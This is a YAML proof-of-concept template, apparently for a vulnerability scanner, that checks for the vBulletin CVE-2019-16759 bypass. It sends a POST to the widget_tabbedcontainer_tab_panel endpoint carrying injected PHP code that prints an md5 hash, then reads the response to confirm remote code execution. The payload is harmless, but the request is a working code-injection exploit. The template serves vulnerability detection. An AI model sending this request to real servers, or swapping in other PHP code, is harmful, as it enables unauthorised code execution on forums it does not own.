detail:
  author: Loneyer
  links:
  - https://blog.exploitee.rs/2020/exploiting-vbulletin-a-tale-of-patch-fail/
expression: r0()
manual: true
name: poc-yaml-vbulletin-cve-2019-16759-bypass
rules:
  r0:
    expression: response.status == 200 && response.body.bcontains(bytes(substr(md5(string(f1)),
      0, 31))) && response.content_type.contains("application/json")
    request:
      body: subWidgets[0][template]=widget_php&subWidgets[0][config][code]=var_dump(md5({{f1}}));
      cache: true
      follow_redirects: true
      headers:
        Content-Type: application/x-www-form-urlencoded
      method: POST
      path: /ajax/render/widget_tabbedcontainer_tab_panel
set:
  f1: randomInt(800000000, 900000000)
transport: http
